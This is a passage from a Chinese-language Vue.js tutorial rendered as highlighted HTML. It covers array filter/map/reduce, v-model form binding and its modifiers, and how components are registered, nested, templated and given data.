class=\"keyword\">let</span> result = nums.filter(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">n</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (n % <span class=\"number\">2</span> === <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//map: 根据规则生成新的数组</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> result = nums.map(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">n</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> n*<span class=\"number\">2</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//reduce: 对数组中所有内容进行汇总, preValue为上一次函数的返回值，初始值为reduce的第二个参数，可省略默认为0</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> result = nums.reduce(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">preValue, n</span>)</span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> preValue+n</span><br><span class=\"line\">&#125;, <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"2-v-model\"><a href=\"#2-v-model\" class=\"headerlink\" title=\"2. v-model\"></a>2. v-model</h1><p>表单绑定，实现表单元素和数据的双向绑定</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">v-model</span>=<span class=\"string\">&quot;message&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">:value</span>=<span class=\"string\">&quot;message&quot;</span> @<span class=\"attr\">input</span>=<span class=\"string\">&quot;message=$event.target.value&quot;</span>&gt;</span>  // v-bind加事件实现双向绑定</span><br><span class=\"line\">    &#123;&#123;message&#125;&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            message: <span class=\"string\">&#x27;test&#x27;</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>绑定radio控件</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">&quot;male&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;radio&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;male&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;gender&quot;</span> <span class=\"attr\">v-model</span>=<span class=\"string\">&quot;gender&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;男&quot;</span>&gt;</span>男</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">label</span> <span class=\"attr\">for</span>=<span class=\"string\">&quot;female&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;radio&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;female&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;gender&quot;</span> <span class=\"attr\">v-model</span>=<span class=\"string\">&quot;gender&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;女&quot;</span>&gt;</span>女</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">label</span>&gt;</span></span><br><span class=\"line\">    &#123;&#123;gender&#125;&#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        data: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            gender: <span class=\"string\">&#x27;&#x27;</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>修饰符</strong></p>\n<p>lazy：懒加载，失焦的时候或者回车的时候，才更新变量</p>\n<p><code>&lt;input type=&quot;text&quot; v-model.lazy=&quot;message&quot;&gt;</code></p>\n<p>number：对输入的类型限定为数字</p>\n<p>trim：对输入的内容去除空格</p>\n<h1 id=\"3-组件化\"><a href=\"#3-组件化\" class=\"headerlink\" title=\"3. 组件化\"></a>3. 组件化</h1><p><strong>使用组件的步骤</strong></p>\n<ol>\n<li>创建组件构造器：<code>Vue.extend()</code></li>\n<li>注册组件：<code>Vue.component()</code></li>\n<li>使用组件</li>\n</ol>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">my-cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">my-cpn</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">const</span> cpn = Vue.extend(&#123;</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        template: `<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`</span></span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"javascript\">    Vue.component(<span class=\"string\">&#x27;my-cpn&#x27;</span>, cpn)   <span class=\"comment\">// 全局组件</span></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">                components: &#123;             <span class=\"comment\">// 注册局部组件</span></span></span><br><span class=\"line\">          cpn2: cpn</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>父组件和子组件</strong></p>\n<p>在父组件中的components中定义子组件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn2</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">const</span> cpn1 = Vue.extend(&#123;</span></span><br><span class=\"line\">        template: `</span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>标题1<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容1<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\">        `</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">const</span> cpn2 = Vue.extend(&#123;</span></span><br><span class=\"line\">        template: `</span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>标题2<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容2<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            <span class=\"tag\">&lt;<span class=\"name\">cpn1</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn1</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\">        `,</span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\"><span class=\"javascript\">            cpn1: cpn1    <span class=\"comment\">// cpn2父组件中定义cpn1子组件</span></span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn2: cpn2,</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>语法糖写法</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">my-cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">my-cpn</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">    Vue.component(<span class=\"string\">&#x27;my-cpn&#x27;</span>, &#123;</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        template: `<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`</span></span></span><br><span class=\"line\">    &#125;) </span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">my-cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">my-cpn</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">          components: &#123;</span><br><span class=\"line\">          cpn2: &#123;</span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">            template: `<span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                    <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">                   <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span>`</span></span></span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>模板分离</strong></p>\n<p>text/x-template或者直接template标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;app&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">cpn2</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">cpn2</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/x-template&quot;</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;mycpn&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"handlebars\"><span class=\"xml\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span></span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题2<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>内容2<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#mycpn&#x27;</span></span></span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            cpn2: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#mycpn2&#x27;</span></span></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>组件数据存放</strong></p>\n<p>data属性，但必须是一个函数</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">template</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;mycpn2&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>标题2<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span>&#123;&#123;message&#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://cdn.jsdelivr.net/npm/vue/dist/vue.js&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">let</span> app = <span class=\"keyword\">new</span> Vue(&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">        el: <span class=\"string\">&#x27;#app&#x27;</span>,</span></span><br><span class=\"line\">        components: &#123;</span><br><span class=\"line\">            cpn2: &#123;</span><br><span class=\"line\"><span class=\"javascript\">                template: <span class=\"string\">&#x27;#mycpn2&#x27;</span>,</span></span><br><span class=\"line\"><span class=\"javascript\">                <span class=\"function\"><span class=\"title\">data</span>(<span class=\"params\"></span>)</span>&#123;   <span class=\"comment\">// 必须是一个函数，返回一个对象，函数新分配一个内存空间，组件之间的值不会相互干扰</span></span></span><br><span class=\"line\"><span class=\"javascript\">                    <span class=\"keyword\">return</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                        message: <span class=\"string\">&#x27;testme&#x27;</span></span></span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span 